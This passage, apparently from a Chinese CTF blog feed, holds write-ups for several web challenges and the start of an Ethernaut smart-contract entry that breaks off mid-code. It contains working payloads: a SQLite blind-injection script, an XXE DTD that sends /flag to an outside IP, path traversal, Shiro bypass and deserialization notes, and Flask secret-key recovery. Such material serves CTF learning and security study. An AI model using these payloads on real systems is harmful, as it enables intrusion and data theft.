class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没见过的sqlite，题解</p><blockquote><p>解题思路是利用sqlite逻辑报错进行盲注,abs函数存在整型溢出</p><p>利用ifnull,nullif注入flag长度</p></blockquote><pre class="line-numbers language-none"><code class="language-none">abs(ifnull(nullif(length((SELECT(flag)from(flag))),&#123;i&#125;),0x8000000000000000))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这句语句的意思是，如果前面的length的值等于我们传入i的值，那么nullif就会返回null，如果返回了null那么ifnull就会返回后面的值，此时abs溢出报错，可以拿到flag长度</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://ba37c8a1-58fb-4250-a1f0-236c553ac9d6.node4.buuoj.cn:81/vote.php"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'id'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f'abs(ifnull(nullif(length((SELECT(flag)from(flag))),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">),0x8000000000000000))'</span></span>    <span class="token punctuation">&#125;</span>    rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'An error occurred'</span> <span class="token keyword">in</span> rep<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'length: '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后通过||来拼接字符，通过replace来进行逐位猜测，通过返回的长度来做判断，而对于字母则使用hex来提取</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">table <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>table<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span> <span class="token comment"># 'zebra' → '7A65627261'</span>table<span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(typeof(.1)),12567)'</span> <span class="token comment"># 'real' → '7265616C'</span>table<span class="token punctuation">[</span><span class="token string">'D'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(0xffffffffffffffff),123)'</span> <span class="token comment"># 0xffffffffffffffff = -1 → '2D31'</span>table<span class="token punctuation">[</span><span class="token string">'E'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(0.1),1230)'</span> <span class="token comment"># 0.1 → 302E31</span>table<span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span> <span class="token comment"># 'dog' → '646F67'</span>table<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">[</span><span class="token string">"C"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">[</span><span class="token string">"F"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span> <span class="token comment"># 'koala' → '6B6F616C61'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终通过<span class="exturl"><a class="exturl__link"   href="https://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/#Sqlite-Voting" >脚本</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>拿到flag</p>        <h2 id="网鼎杯-2020-青龙组-filejava"   >          <a href="#网鼎杯-2020-青龙组-filejava" class="heading-link"><i class="fas fa-link"></i></a><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h2>      <p>一个上传，上传之后可以下载，看到链接里面有文件名，尝试目录穿越拿web.xml文件<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210022204005.png"></p><p>下载class（<code>../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</code>）进行反编译，得到源码，我们直接看上传的关键部分</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>filename<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"excel-"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string">"xlsx"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>fileExtName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">Workbook</span> wb1 <span class="token operator">=</span> <span class="token class-name">WorkbookFactory</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Sheet</span> sheet <span class="token operator">=</span> wb1<span class="token punctuation">.</span><span class="token function">getSheetAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sheet<span class="token punctuation">.</span><span class="token function">getFirstRowNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvalidFormatException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"poi-ooxml-3.10 has something wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处使用<code>poi-ooxml-3.10</code>来解析数据，这个版本有漏洞可导致XXE，CVE-2014-3529</p><p>那么就直接利用，首先在自己服务器上放一个f.dtd</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;182.61.46.138?p&#x3D;%file;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后更改xlsx中的[Content_Types].xml文件，添加如下内容</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;182.61.46.138&#x2F;f.dtd&quot;&gt;%remote;%int;%send;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>重新压缩上传即可接收flag</p>        <h2 id="HXBCTF-2021-easywill"   >          <a href="#HXBCTF-2021-easywill" class="heading-link"><i class="fas fa-link"></i></a><a href="#HXBCTF-2021-easywill" class="headerlink" title="[HXBCTF 2021]easywill"></a>[HXBCTF 2021]easywill</h2>      <p>跟源码，后面再补</p>        <h2 id="羊城杯-2020-EasySer"   >          <a href="#羊城杯-2020-EasySer" class="heading-link"><i class="fas fa-link"></i></a><a href="#羊城杯-2020-EasySer" class="headerlink" title="[羊城杯 2020]EasySer"></a>[羊城杯 2020]EasySer</h2>      <p>不给源码就是纯纯有病的谜语题，给了源码简单多了，正常序列化使用base64绕过die即可</p>        <h2 id="JMCTF-2021-UploadHub"   >          <a href="#JMCTF-2021-UploadHub" class="heading-link"><i class="fas fa-link"></i></a><a href="#JMCTF-2021-UploadHub" class="headerlink" title="[JMCTF 2021]UploadHub"></a>[JMCTF 2021]UploadHub</h2>      <p>.htaccess</p>        <h2 id="红明谷CTF-2021-JavaWeb"   >          <a href="#红明谷CTF-2021-JavaWeb" class="heading-link"><i class="fas fa-link"></i></a><a href="#红明谷CTF-2021-JavaWeb" class="headerlink" title="[红明谷CTF 2021]JavaWeb"></a>[红明谷CTF 2021]JavaWeb</h2>      <p>java，进去就是让我们login，login页面让我们访问json，但是没权限需要先登录，那就尝试传入登录，登录失败，但是看响应头<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210070120704.png"></p><p>setCookie中的deleteMe可以确认使用的是shiro框架（我也不知道为啥</p><p>那么首先使用CVE-2020-11989来进行Apache Shiro权限绕过，加个/;/json来直接访问json</p><p>然后使用CVE-2019-14439的反序列化链打进去，用JNDI-Injection-Exploit来生成payload</p>        <h2 id="HCTF-2018-Hideandseek"   >          <a href="#HCTF-2018-Hideandseek" class="heading-link"><i class="fas fa-link"></i></a><a href="#HCTF-2018-Hideandseek" class="headerlink" title="[HCTF 2018]Hideandseek"></a>[HCTF 2018]Hideandseek</h2>      <p>登录，任意输入除admin之外的用户名和密码，然后就让上传zip，第一件事就想到软连接，确实可以<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210102353287.png"></p><p>那读一下源码吧，盲猜是个python，proc读试试，<del>事实证明直接莽是没什么卵子用的</del>，还是乖乖读了environ，然后/app/main.py读源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>session<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> escape<span class="token punctuation">,</span> request<span class="token punctuation">,</span>Response<span class="token keyword">import</span> uuid<span class="token keyword">import</span> base64<span class="token keyword">import</span> random<span class="token keyword">import</span> flag<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filename<span class="token keyword">import</span> osrandom<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'./uploads'</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'MAX_CONTENT_LENGTH'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token number">1024</span>ALLOWED_EXTENSIONS <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'zip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'.'</span> <span class="token keyword">in</span> filename <span class="token keyword">and</span> \           filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> ALLOWED_EXTENSIONS<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    error <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>error <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> forbidden<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> user<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>    password<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">and</span> username <span class="token operator">!=</span> <span class="token string">''</span> <span class="token keyword">and</span> password <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>error<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'the_file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'the_file'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">file</span> <span class="token keyword">and</span> allowed_file<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>        filename <span class="token operator">=</span> secure_filename<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span>        file_save_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>file_save_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'This file already exists'</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>file_save_path<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'This file is not a zipfile'</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        extract_path <span class="token operator">=</span> file_save_path <span class="token operator">+</span> <span class="token string">'_'</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'unzip -n '</span> <span class="token operator">+</span> file_save_path <span class="token operator">+</span> <span class="token string">' -d '</span><span class="token operator">+</span> extract_path<span class="token punctuation">)</span>        read_obj <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat '</span> <span class="token operator">+</span> extract_path <span class="token operator">+</span> <span class="token string">'/*'</span><span class="token punctuation">)</span>        <span class="token builtin">file</span> <span class="token operator">=</span> read_obj<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        read_obj<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'rm -rf '</span> <span class="token operator">+</span> extract_path<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token boolean">None</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>file_save_path<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">file</span> <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'aGN0Zg=='</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment">#app.run(debug=True)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">10008</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看代码读一下随机数的种子</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> uuid<span class="token keyword">import</span> randommac <span class="token operator">=</span> <span class="token string">"0e:48:30:60:37:27"</span>temp <span class="token operator">=</span> mac<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> temp<span class="token punctuation">]</span>temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">bin</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> temp<span class="token punctuation">]</span>temp <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>mac <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>mac<span class="token punctuation">)</span>randStr <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>randStr<span class="token punctuation">)</span><span class="token comment">#69.83331307187989</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>剩下就是伪造拿flag</p>        <h2 id="FBCTF2019-Products-Manager"   >          <a href="#FBCTF2019-Products-Manager" class="heading-link"><i class="fas fa-link"></i></a><a href="#FBCTF2019-Products-Manager" class="headerlink" title="[FBCTF2019]Products Manager"></a>[FBCTF2019]Products Manager</h2>      <p>有源码，是基于约束的SQL攻击，直接给payload</p><pre class="line-numbers language-none"><code class="language-none">name&#x3D;facebook                                                                                    1111Secret&#x3D;des&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut记录</title>
      <link href="/posts/b1d79a49.html"/>
      <url>/posts/b1d79a49.html</url>
      
        <content type="html"><![CDATA[        <h2 id="Fallback"   >          <a href="#Fallback" class="heading-link"><i class="fas fa-link"></i></a><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2>      <p>首先看通关方式</p><blockquote><p>仔细看下面的合约代码.</p><p>通过这关你需要</p><ol><li>获得这个合约的所有权</li><li>把他的余额减到0</li></ol><p> 这可能有帮助</p><ul><li>如何通过与ABI互动发送ether</li><li>如何在ABI之外发送ether</li><li>转换 wei/ether 单位 (参见 <code>help()</code> 命令)</li><li>Fallback 方法</li></ul></blockquote><p>再看代码</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Fallback</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> contributions<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1000</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">modifier</span> onlyOwner <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>            msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">,</span>            <span class="token string">"caller is not the owner"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">contribute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">&lt;</span> <span class="token number">0.001</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>    contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span 